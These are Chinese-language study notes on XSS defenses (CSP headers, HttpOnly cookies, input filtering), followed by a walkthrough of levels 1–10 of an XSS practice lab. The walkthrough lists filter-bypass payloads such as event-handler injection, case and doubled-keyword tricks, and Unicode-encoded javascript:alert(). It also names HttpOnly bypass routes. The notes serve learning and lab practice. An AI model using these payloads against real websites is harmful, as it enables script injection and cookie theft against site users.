
---
➢ XSS跨站-安全防御-CSP

➢ XSS跨站-安全防御-HttpOnly

➢ XSS跨站-安全防御-XSSFilter

# 一、CSP (Content Security Policy 内容安全策略)

内容安全策略是一种==可信白名单机制==，来**限制网站中是否可以包含某来源内容**。
该制度明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单，
它的实现和执行全部由浏览器完成，开发者只需提供配置。

- 禁止加载外域代码，防止复杂的攻击逻辑。

- 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。

- 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。

- 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。

合理使用上报可以及时发现XSS，利于尽快修复问题。

实验：

开启CSP时XSS的加载情况

未开启CSP时XSS的加载情况

绕过：有但鸡肋

https://xz.aliyun.com/t/12370

https://blog.csdn.net/a1766855068/article/details/89370320

开启方式: 
```
header("Content-Security-Policy:img-src 'self' ");
```

# 二、HttpOnly

禁止页面的JavaScript访问带有HttpOnly属性的Cookie。

PHP.INI设置或代码引用

```
session.cookie_httponly =1
ini_set("session.cookie_httponly", 1);
-setcookie('', '', time() + 3600, '/xss', '', false, true);
```

实验：

开启HttpOnly时XSS窃取Cookie的加载情况

未开启HttpOnly时XSS窃取Cookie的加载情况

绕过：有但鸡肋

(1) CVE-2012-0053

(2) PHPINFO页面/

(3) Flash/Java

https://blog.csdn.net/weixin_42478365/article/details/116597222

思路：不获取Cookie采用方式（钓鱼，浏览器攻击框架等）

# 三、XSS Filter

检查用户输入的数据中是否包含特殊字符， 如<、>、’、”,进行实体化等。

实验：手工分析&工具分析

Xss-Lab 标签及常见过滤绕过

（靶场）环境下载：#https://github.com/Re13orn/xss-lab

参考资料：#https://xz.aliyun.com/t/4067

工具资料：#https://github.com/s0md3v/XSStrike

## （靶场部分思路）
1、无任何过滤

	<script>alert()</script>

2、实体化 输入框没有

	"> <script>alert()</script> <"

3、全部实体化 利用标签事件 单引号闭合

	' onfocus=javascript:alert() '

4、全部实体化 利用标签事件 双引号闭合

	" onfocus=javascript:alert() "

5、事件关键字过滤 利用其他标签调用 双引号闭合

	"> <a href=javascript:alert()>xxx</a> <"

6、利用大小写未正则匹配

	"> <sCript>alert()</sCript> <"

7、利用双写绕过匹配

	"> <a hrehreff=javasscriptcript:alert()>x</a> <"

8、利用Unicode编码

	&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0029

9、利用Unicode编码（内容检测）

	&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0029;('http://')

10、隐藏属性触发闭合

	?t_sort=" onfocus=javascript:alert() type="text

11-20

https://blog.csdn.net/l2872253606/article/details/125638898

# 黑盒XSS手工分析：

1. 1、页面中显示的数据找可控的（有些隐藏的）

2. 2、利用可控地方发送JS代码去看执行加载情况

3. 3、成功执行即XSS，不能成功就看语句输出的地方显示（过滤）

4. 4、根据显示分析为什么不能执行（实体化，符号括起来，关键字被删除等）
